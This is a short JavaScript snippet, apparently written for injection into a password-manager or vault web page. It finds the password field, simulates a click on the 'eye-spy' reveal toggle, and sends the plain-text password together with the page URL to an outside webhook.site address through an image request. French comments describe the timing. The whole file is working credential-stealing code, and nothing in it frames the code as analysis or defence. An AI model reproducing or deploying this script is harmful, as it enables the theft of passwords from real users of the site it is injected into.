(function() {
  if (window.__vault_jok3r_loaded__) return;
  window.__vault_jok3r_loaded__ = true;

  const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';

  function exfiltrate(password) {
    let i = new Image();
    i.src = `${webhook}?password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}`;
  }

  function revealPasswordAndExfil() {
    const eyeSpy = document.querySelector('.eye-spy');
    const passwordInput = document.getElementById('password');

    if (!eyeSpy || !passwordInput) {
      setTimeout(revealPasswordAndExfil, 500);
      return;
    }

    // Simule un clic pour activer togglePasswordVisibility (utile si le comportement dépend de l'UI)
    eyeSpy.click();

    // Patiente un petit peu si nécessaire
    setTimeout(() => {
      exfiltrate(passwordInput.value);
    }, 200); // délai léger pour s'assurer que le champ est bien passé en clair
  }

  revealPasswordAndExfil();
})();
